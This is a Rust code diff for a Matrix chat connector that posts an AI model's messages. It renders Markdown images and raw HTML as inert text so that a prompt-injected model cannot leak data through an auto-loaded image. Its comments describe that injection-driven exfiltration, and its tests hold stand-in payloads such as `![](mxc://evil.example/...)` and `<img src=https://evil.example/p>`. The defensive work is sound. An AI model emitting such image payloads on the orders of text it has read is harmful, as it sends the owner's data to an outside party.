@@ -4,6 +4,11 @@
 //! encrypted rooms by itself. The one thing it cannot know is the shape of a
 //! chat conversation: that a question wants tappable answers, and that
 //! "typing" is a notice the server forgets after a few seconds.
+//!
+//! Nor can it know whose words a message carries. Here they are a model's,
+//! and a model that has read a mail or a web page can have been told what to
+//! write, so the HTML a message goes out with shows no image and no markup
+//! of the model's own; see [`html_of`].
 
 use super::MatrixConnector;
 use super::errors::classify;
@@ -13,8 +18,11 @@ use matrix_sdk::Room;
 use matrix_sdk::RoomState;
 use matrix_sdk::ruma::events::reaction::ReactionEventContent;
 use matrix_sdk::ruma::events::relation::Annotation;
-use matrix_sdk::ruma::events::room::message::RoomMessageEventContent;
+use matrix_sdk::ruma::events::room::message::{FormattedBody, RoomMessageEventContent};
 use matrix_sdk::ruma::{EventId, OwnedEventId, OwnedRoomId, RoomId};
+// Images become links and raw HTML text -- see `everyday_service::inert_markdown`.
+use everyday_service::inert_markdown as inert;
+use pulldown_cmark::{Event, Options, Parser, Tag, TagEnd};
 use std::collections::{HashMap, VecDeque};
 use std::sync::Mutex;
 use std::time::Duration;
@@ -95,7 +103,7 @@ impl MatrixConnector {
         let mut last = None;
         for piece in rules::split_markdown(markdown, MAX_MARKDOWN_BYTES) {
             let sent = room
-                .send(RoomMessageEventContent::text_markdown(piece))
+                .send(message_of(piece))
                 .await
                 .map_err(|e| classify(e.client_api_error_kind(), false, "send a message", &e))?;
             last = Some(sent.response.event_id);
@@ -183,6 +191,68 @@ impl MatrixConnector {
     }
 }
 
+/// What ruma's `text_markdown` asks pulldown-cmark for, so that a message
+/// looks as it always has.
+const MARKDOWN: Options = Options::ENABLE_TABLES.union(Options::ENABLE_STRIKETHROUGH);
+
+/// One piece of Markdown as a message: the Markdown itself as the plain body,
+/// as `text_markdown` sends it, and HTML beside it when it has any formatting.
+fn message_of(markdown: &str) -> RoomMessageEventContent {
+    match html_of(markdown) {
+        Some(html) => RoomMessageEventContent::text_html(markdown, html),
+        None => RoomMessageEventContent::text_plain(markdown),
+    }
+}
+
+/// `markdown` as a message's HTML, or `None` when it has no formatting.
+///
+/// This is ruma's `text_markdown` -- the same parser and options, line breaks
+/// kept, a lone paragraph sent without the `<p>` around it as the spec asks
+/// -- with one difference: nothing in the result makes the owner's client
+/// fetch anything by itself. A model told by something it read to end with
+/// `![](mxc://evil.example/<data>)` would otherwise have Element load it the
+/// moment it arrived, through the owner's own homeserver, and the data would
+/// leave without a click. So an image is shown as its alt text and a link to
+/// its address, and raw HTML as the text it is; see [`inert`].
+fn html_of(markdown: &str) -> Option<String> {
+    // Whether there is any formatting at all is left to ruma, so a message
+    // that has none still goes as plain text exactly when it did before.
+    FormattedBody::markdown(markdown)?;
+    let events: Vec<Event<'_>> = Parser::new_ext(markdown, MARKDOWN)
+        .map(|event| match event {
+            Event::SoftBreak => Event::HardBreak,
+            other => other,
+        })
+        .collect();
+    let lone_paragraph = matches!(events.first(), Some(Event::Start(Tag::Paragraph)))
+        && matches!(events.last(), Some(Event::End(TagEnd::Paragraph)))
+        && !events[1..].iter().any(|event| matches!(event, Event::Start(tag) if is_block(tag)));
+    let mut events = events.into_iter();
+    if lone_paragraph {
+        events.next();
+        events.next_back();
+    }
+    let mut html = String::new();
+    pulldown_cmark::html::push_html(&mut html, inert(events));
+    Some(html)
+}
+
+/// The tags ruma counts as blocks when it decides whether a message is one
+/// paragraph.
+fn is_block(tag: &Tag<'_>) -> bool {
+    matches!(
+        tag,
+        Tag::Paragraph
+            | Tag::Heading { .. }
+            | Tag::BlockQuote(_)
+            | Tag::CodeBlock(_)
+            | Tag::HtmlBlock
+            | Tag::List(_)
+            | Tag::FootnoteDefinition(_)
+            | Tag::Table(_)
+    )
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -225,5 +295,72 @@ mod tests {
         }
         assert!(questions.was_asked_in(&event, &room));
         assert_eq!(questions.inner.lock().unwrap().order.len(), 1);
+    }
+
+    #[test]
+    fn ordinary_formatting_is_rendered_exactly_as_text_markdown_did() {
+        for markdown in [
+            "Three things are due.",
+            "Hello\nworld.",
+            "**Morning brief**\n\nThree things are due.",
+            "Just *one* line with a [link](https://example.org \"A title\")",
+            "- Book the dentist\n- [Pay rent](https://bank.example)\n\n1. one\n2. two",
+            "| a | b |\n|---|---|\n| 1 | 2 |",
+            "~~gone~~ and `code`\nnext line",
+            "# Today\n\n> quoted\n\n```\nlet x = 1;\n```",
+            "<https://example.org> and someone@example.org",
+        ] {
+            let ruma = FormattedBody::markdown(markdown).map(|formatted| formatted.body);
+            assert_eq!(html_of(markdown), ruma, "{markdown}");
+        }
+    }
+
+    #[test]
+    fn an_image_is_a_link_to_follow_never_a_picture_to_load() {
+        assert_eq!(
+            html_of("![](mxc://evil.example/c2VjcmV0)").as_deref(),
+            Some("<a href=\"mxc://evil.example/c2VjcmV0\">mxc://evil.example/c2VjcmV0</a>")
+        );
+        let html = html_of("Here you go.\n\n![chart](https://evil.example/?d=secret)").unwrap();
+        assert!(!html.contains("<img"), "got {html}");
+        assert!(html.contains(
+            "chart (<a href=\"https://evil.example/?d=secret\">https://evil.example/?d=secret</a>)"
+        ));
+    }
+
+    #[test]
+    fn an_image_inside_a_link_shows_its_address_as_text() {
+        assert_eq!(
+            html_of("[![build](https://evil.example/b.png)](https://ci.example)").as_deref(),
+            Some("<a href=\"https://ci.example\">build (https://evil.example/b.png)</a>")
+        );
+    }
+
+    #[test]
+    fn raw_html_is_shown_as_the_text_it_is() {
+        let html = html_of("<img src=x>").unwrap();
+        assert!(!html.contains("<img"), "got {html}");
+        assert!(html.contains("&lt;img src=x&gt;"));
+        assert_eq!(
+            html_of("See <img src=https://evil.example/p> **now**").as_deref(),
+            Some("See &lt;img src=https://evil.example/p&gt; <strong>now</strong>")
+        );
+    }
+
+    #[test]
+    fn the_plain_body_is_the_markdown_as_written() {
+        use matrix_sdk::ruma::events::room::message::MessageType;
+        let markdown = "**Note**\n\n![](https://evil.example/x)";
+        let MessageType::Text(text) = message_of(markdown).msgtype else {
+            panic!("not a text message");
+        };
+        assert_eq!(text.body, markdown);
+        assert!(text.formatted.is_some_and(|formatted| !formatted.body.contains("<img")));
+
+        let MessageType::Text(text) = message_of("Hello there.").msgtype else {
+            panic!("not a text message");
+        };
+        assert_eq!(text.body, "Hello there.");
+        assert!(text.formatted.is_none());
     }
 }
